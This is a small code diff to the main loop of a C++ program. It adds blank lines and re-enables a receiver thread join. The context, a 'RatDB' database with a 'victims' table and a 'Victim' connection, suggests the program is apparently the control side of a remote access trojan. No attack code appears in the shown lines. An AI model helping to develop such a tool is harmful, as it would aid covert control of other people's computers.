@@ -52,6 +52,8 @@ int main(int argc, char** argv)
 	}
 	int cols = RatDB.GetNumColumns("victims");	
 
+
+
 	bool run = true;
 	string input;
 	do
@@ -136,7 +138,7 @@ int main(int argc, char** argv)
 		}
 	} while (run);
 
-	//recvThread.join();
+	recvThread.join();
 	Victim.DisConnect();
     return 0;
 }
